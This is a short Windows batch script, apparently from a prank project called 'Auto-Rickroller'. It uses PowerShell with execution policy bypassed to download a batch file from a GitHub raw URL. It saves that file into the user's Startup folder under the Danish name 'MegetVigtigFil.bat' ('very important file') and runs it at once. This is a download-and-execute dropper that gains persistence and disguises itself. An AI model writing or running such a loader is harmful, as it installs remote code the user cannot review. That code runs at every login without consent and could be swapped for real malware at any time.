@echo off
set "bat_url=https://raw.githubusercontent.com/patr824a/Auto-Rickroller/refs/heads/main/Chrome/Auto-updater.bat"
set "bat_path=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MegetVigtigFil.bat"
powershell -NoProfile -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile('%bat_url%', '%bat_path%')"

start "" "%bat_path%"
